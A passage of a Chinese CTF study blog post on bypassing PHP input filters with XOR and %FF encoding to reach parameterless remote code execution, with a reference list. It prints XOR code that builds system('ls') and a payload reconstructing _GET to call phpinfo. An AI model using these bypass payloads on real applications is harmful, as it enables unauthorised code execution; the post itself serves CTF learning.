class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;&lt;&quot;</span>^<span class="hljs-string">&quot;a&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;?&quot;</span>^<span class="hljs-string">&quot;d&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;p&quot;</span>^<span class="hljs-string">&quot;1&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;h&quot;</span>^<span class="hljs-string">&quot;1&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;p&quot;</span>^<span class="hljs-string">&quot;1&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot; &quot;</span>^<span class="hljs-string">&quot;a&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;s&quot;</span>^<span class="hljs-string">&quot;1&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;y&quot;</span>^<span class="hljs-string">&quot;1&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;s&quot;</span>^<span class="hljs-string">&quot;2&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;t&quot;</span>^<span class="hljs-string">&quot;1&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;e&quot;</span>^<span class="hljs-string">&quot;1&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;m&quot;</span>^<span class="hljs-string">&quot;6&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;(&quot;</span>^<span class="hljs-string">&quot;a&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;&#x27;&quot;</span>^<span class="hljs-string">&quot;a&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;l&quot;</span>^<span class="hljs-string">&quot;1&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;s&quot;</span>^<span class="hljs-string">&quot;1&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;&#x27;&quot;</span>^<span class="hljs-string">&quot;a&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;)&quot;</span>^<span class="hljs-string">&quot;a&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;;&quot;</span>^<span class="hljs-string">&quot;a&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;?&quot;</span>^<span class="hljs-string">&quot;b&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;&gt;&quot;</span>^<span class="hljs-string">&quot;c&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;]&quot;</span>^<span class="hljs-string">&quot;a&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;[&quot;</span>^<span class="hljs-string">&quot;d&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;A&quot;</span>^<span class="hljs-string">&quot;1&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;Y&quot;</span>^<span class="hljs-string">&quot;1&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;A&quot;</span>^<span class="hljs-string">&quot;1&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;A&quot;</span>^<span class="hljs-string">&quot;a&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;B&quot;</span>^<span class="hljs-string">&quot;1&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;H&quot;</span>^<span class="hljs-string">&quot;1&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;A&quot;</span>^<span class="hljs-string">&quot;2&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;E&quot;</span>^<span class="hljs-string">&quot;1&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;T&quot;</span>^<span class="hljs-string">&quot;1&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;[&quot;</span>^<span class="hljs-string">&quot;6&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;I&quot;</span>^<span class="hljs-string">&quot;a&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;F&quot;</span>^<span class="hljs-string">&quot;a&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;]&quot;</span>^<span class="hljs-string">&quot;1&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;B&quot;</span>^<span class="hljs-string">&quot;1&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;F&quot;</span>^<span class="hljs-string">&quot;a&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;H&quot;</span>^<span class="hljs-string">&quot;a&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;Z&quot;</span>^<span class="hljs-string">&quot;a&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;]&quot;</span>^<span class="hljs-string">&quot;b&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;]&quot;</span>^<span class="hljs-string">&quot;c&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-comment">/*输出</span><br><span class="hljs-comment">]</span><br><span class="hljs-comment">[</span><br><span class="hljs-comment">A</span><br><span class="hljs-comment">Y</span><br><span class="hljs-comment">A</span><br><span class="hljs-comment">A</span><br><span class="hljs-comment">B</span><br><span class="hljs-comment">H</span><br><span class="hljs-comment">A</span><br><span class="hljs-comment">E</span><br><span class="hljs-comment">T</span><br><span class="hljs-comment">[</span><br><span class="hljs-comment">I</span><br><span class="hljs-comment">F</span><br><span class="hljs-comment">]</span><br><span class="hljs-comment">B</span><br><span class="hljs-comment">F</span><br><span class="hljs-comment">H</span><br><span class="hljs-comment">Z</span><br><span class="hljs-comment">]</span><br><span class="hljs-comment">]</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&lt;</span><br><span class="hljs-comment">?</span><br><span class="hljs-comment">p</span><br><span class="hljs-comment">h</span><br><span class="hljs-comment">p</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">s</span><br><span class="hljs-comment">y</span><br><span class="hljs-comment">s</span><br><span class="hljs-comment">t</span><br><span class="hljs-comment">e</span><br><span class="hljs-comment">m</span><br><span class="hljs-comment">(</span><br><span class="hljs-comment">&#x27;</span><br><span class="hljs-comment">l</span><br><span class="hljs-comment">s</span><br><span class="hljs-comment">&#x27;</span><br><span class="hljs-comment">)</span><br><span class="hljs-comment">;</span><br><span class="hljs-comment">?</span><br><span class="hljs-comment">&gt;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;AYAABHAET[IF]BFHZ]]&quot;</span>^<span class="hljs-string">&quot;ad111a112116aa11aaabc&quot;</span>);<br><span class="hljs-comment">//没有输出，因为&lt;?php system(&#x27;ls&#x27;);?&gt;是代码，已经执行了，但var_dump()会显示有21个字符，或者两边都删除前两位，即可看到值</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>制作时，^左边为我们想要的php字符，右边可设置1~9/a-z/A-Z，只要得到异或出来的值即可，之后将得到的值替换原来^左边的值，再次异或，即为你想要的php字符。如上面的&quot;&lt;“^“a”，异或后的值为]，再将原来的&lt;替换为]，”]&quot;^&quot;a&quot;的结果为&lt;，所以我们绕过时，可以使用异或来得到我们想要的值</p>
<p>打CTF时，若遇到白名单过滤，但没有过滤^，可以使用该方法绕过，例如：<code>http://x.x.x.x/?page=php://input</code>，如果目标过滤:和/时这时，就可以使用<code>http://x.x.x.x/?page=php&quot;[NN&quot;^&quot;aaa&quot;input</code>，这里使用&quot;[NN&quot;^&quot;aaa&quot;异或后的值即表示被过滤的://，但需要注意的是，目标不能同时都过滤单双引号</p>
<p>但我们可以拼凑使得异或两边的都是英文字母，这样就不需要加单或双引号例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> (@AAA^@qwe);<br><span class="hljs-comment">//输出06$</span><br></code></pre></td></tr></table></figure>
<p>到时候就可以也绕过单双引号，payload类<code>似http://x.x.x.x/?page=@xx^@xx</code>这样就可以了–不过这个操作没看懂（留着看日后能否碰撞出火花吧）</p>
<h2 id="7-3-FF的作用"><a href="#7-3-FF的作用" class="headerlink" title="7-3-FF的作用"></a>7.3 %FF的作用</h2>
<p>这里先跟着佬的思路走一遍，payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo<br><span class="hljs-comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></code></pre></td></tr></table></figure>
<p>看如上构造，我们接下来学习一波构造原理，这里先 上一下师傅的图片</p>
<p class='item-img' data-src='image-20231020105201190.png'><img src="image-20231020105201190.png" alt="image-20231020105201190"></p>
<p>能够接收，毕竟异或就是用不可见字符相异或表示出我们想要的字符串么，</p>
<p>然后为了传输，就进行一下url编码，便于传输和识别，</p>
<p>这里用到的关键符号就是<code>^</code>,用到的方法是利用不可见字符的异或来构造<code>_GET</code>对函数进行调用，首先是获取<code>_GET</code>的ascii码值</p>
<p class='item-img' data-src='image-20231020105232167.png'><img src="image-20231020105232167.png" alt="image-20231020105232167"></p>
<p>然后使用<code>0xff</code>分别对这几个字符进行异或操作</p>
<p>这里可能就会有疑问，为何必须用0xff来进行操作 ，而其他不行呢。</p>
<p>这里起先我也不清楚（不会思考罢了），之后看到评论区有一则回答很正解：</p>
<p>之所以用%ff是因为他用二进制表示为11111111。</p>
<p>我们知道0^1=1,1^1=1，这也就意味着我们不论传入何种字符，其转换为二进制后的数字与是上述0xff的二进制进行按位异或，最后得到的结果（也就是二进制数）一定是与原来不相同的，这时我们用得到的结果再次与0xff进行异或，得到的结果就一定是最初的字符，也就是说：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&quot;A&quot;^&quot;0XFF&quot;=&quot;其他&quot;,随后,  &quot;其他&quot;^&quot;0xff&quot;=&quot;A&quot;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231020105246550.png'><img src="image-20231020105246550.png" alt="image-20231020105246550"></p>
<p>得到了字符串<code>0xa0b8baab</code>（均为不可见字符），将其与<code>0xffffffff</code>进行异或操作，就变成了<code>_GET</code>了，所以payload为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?_=$&#123;%ffffffff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo<br></code></pre></td></tr></table></figure>
<p>url编码也是16进制的，所以0xff与%ff是同一个意思</p>
<p>这里上一下师傅对此的解释：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">因为url也是16进制编码的，而且a^b^b = a所以下面的这个%a0%b8%ba%ab就是0xa0xb80xba0xab,连在一起就是0xa0b8baab。16进制的a0 b8 ba ab对应的就是10进制的95 71 69 84和0xff相^出来的，， 然后，，95 71 69 84对应的也就是_ G E T<br>也就是_GET每个字母都和0xff或者叫%ff或者叫255相异或，变成0xa0xb80xba0xab。进行bypass。然后，再次与%ff进行异或，就变成了_GET。就达成目的了，<br></code></pre></td></tr></table></figure>
<p>总结：</p>
<p>如果我们想得到某个字符（但该字符被过滤了），那我们先令该字符与0xff进行异或，得到中间值之后，让中间值再次与0xff异或，便可以得到我们想要的某个字符</p>
<h1>0x08 参考文章</h1>
<h2 id="php无参数相关"><a href="#php无参数相关" class="headerlink" title="php无参数相关"></a>php无参数相关</h2>
<p><a target="_blank" rel="noopener" href="https://caidexin.top/2021/01/10/blog_formal/security/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/">PHP无参数RCE</a></p>
<p><a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">PHP Parametric Function RCE</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9360">PHP的无参数RCE</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a>–p神!!!</p>
<p><a target="_blank" rel="noopener" href="https://dydong.ltd/2022/09/11/%E6%97%A0%E5%8F%82RCE/">无参RCE</a></p>
<p><a target="_blank" rel="noopener" href="https://dydong.ltd/2022/09/11/%E6%97%A0%E5%8F%82RCE/#toc-heading-5">无参RCE</a>–递增绕过可参考，日后遇到在学习</p>
<h2 id="php异或相关"><a href="#php异或相关" class="headerlink" title="php异或相关"></a>php异或相关</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41617034/article/details/104441032?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169776726616800227480549%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169776726616800227480549&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-104441032-null-null.142%5Ev96%5Epc_search_result_base2&amp;utm_term=PHP%E5%BC%82%E6%88%96&amp;spm=1018.2226.3001.4187">PHP异或</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Zero_Adam/article/details/115470672?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169772628416800192224232%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=169772628416800192224232&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-115470672-null-null.142%5Ev96%5Epc_search_result_base2&amp;utm_term=%5B%7E%28%E5%BC%82%E6%88%96%29%5D%5B%21%25FF%5D%E7%9A%84%E5%BD%A2%E5%BC%8F%E7%BB%84%E6%88%90%E5%AD%97%E7%AC%A6%E4%B8%B2&amp;spm=1018.2226.3001.4187">【芝士】%ff%ff%ff%ff%ff%ff%ff || 0xff0xff0xff0xff0xff0xff0xff 异或，~ 取反过rce 自己应该是弄明白了，</a></p>
<h2 id="wp相关"><a href="#wp相关" class="headerlink" title="wp相关"></a>wp相关</h2>
<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/07/02/BUUCTF%20Web%20WriteUp%207/#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp4-Rceme">BUUCTF Web Writeup 7</a></p>
<p>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/erR0Ratao/p/14077015.html#rceme">极客大挑战2020虚空复盘</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&amp;mid=2247485218&amp;idx=1&amp;sn=e910ddbd965ecb069b4da3d06443f337&amp;chksm=e92292a1de551bb7c48bcca06053faed2a212642ee6a2f7767f671cc553f6a2d435f99fbfae6&amp;mpshare=1&amp;scene=23&amp;srcid=1202ez9PcajE5NTRrZG6OF9G&amp;sharer_sharetime=1606872114678&amp;sharer_shareid=8752e0fdce9cf3d7a08d6c6826060293&amp;poc_token=HFM-MWWj9yElLnEEY44MDqgXVUm10XYWObWIMevW">官方wp</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/shinygod/article/details/123961322">[极客大挑战 2020]Roamphp 1、2、4</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_63231007/article/details/125798206?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=CTF%20%5B~(%E5%BC%82%E6%88%96)%5D%5B!%25FF%5D&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-125798206.142%5Ev96%5Epc_search_result_base2&amp;spm=1018.2226.3001.4187">buuctf刷题12(zip://包含&amp; 取反+无参数rce &amp; csrf &amp; FFI扩展安全)</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/10/22/0xGame%202023/">← Next 0xGame 2023</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/10/15/Web_php_wrong_nginx_config/">Web_php_wrong_nginx_config Prev →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">0x02 概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">0x03 过滤场景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">0x04 绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-getallheaders"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 getallheaders()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-get-defined-vars"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 get_defined_vars()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-session-id"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 session_id()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-getenv"><span class="toc-number">4.4.</span> <span class="toc-text">4.4 getenv()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-5-%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C%E7%9B%B8%E5%85%B3"><span class="toc-number">4.5.</span> <span class="toc-text">4.5 目录操作相关</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">0x05 相关函数总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-phpversion"><span class="toc-number">5.1.</span> <span class="toc-text">5.1 phpversion()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-crypt"><span class="toc-number">5.2.</span> <span class="toc-text">5.2 crypt()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-3-%E6%95%B0%E7%BB%84%E6%93%8D%E4%BD%9C"><span class="toc-number">5.3.</span> <span class="toc-text">5.3 数组操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-4-%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C"><span class="toc-number">5.4.</span> <span class="toc-text">5.4 目录操作</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">0x06 实战操作</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp4-Rceme"><span class="toc-number">6.1.</span> <span class="toc-text">[极客大挑战 2020]Roamphp4-Rceme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%8F%82RCE%E6%9E%84%E9%80%A0%E6%80%9D%E6%83%B3%EF%BC%9A"><span class="toc-number">6.2.</span> <span class="toc-text">无参RCE构造思想：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP7%E4%B8%8B"><span class="toc-number">6.2.1.</span> <span class="toc-text">PHP7下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP5%E4%B8%8B-p%E7%A5%9E%E7%9A%84%E9%A1%B6%E5%B0%96%E6%80%9D%E8%B7%AF%EF%BC%88%E6%B3%A8%E9%87%8Dp%E7%A5%9E%E7%9A%84%E6%80%9D%E8%80%83%E6%96%B9%E5%BC%8F%EF%BC%89"><span class="toc-number">6.2.2.</span> <span class="toc-text">PHP5下-p神的顶尖思路（注重p神的思考方式）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">0x07 %FF以及XOR的思考</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#7-1-PHP%E5%BC%82%E6%88%96%E6%B5%81%E7%A8%8B"><span class="toc-number">7.1.</span> <span class="toc-text">7.1 PHP异或流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-2-%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97%E6%B3%95%E5%88%99"><span class="toc-number">7.2.</span> <span class="toc-text">7.2 异或运算法则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-3-FF%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">7.3.</span> <span class="toc-text">7.3 %FF的作用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">0x08 参考文章</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E6%97%A0%E5%8F%82%E6%95%B0%E7%9B%B8%E5%85%B3"><span class="toc-number">8.1.</span> <span class="toc-text">php无参数相关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%BC%82%E6%88%96%E7%9B%B8%E5%85%B3"><span class="toc-number">8.2.</span> <span class="toc-text">php异或相关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wp%E7%9B%B8%E5%85%B3"><span class="toc-number">8.3.</span> <span class="toc-text">wp相关</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>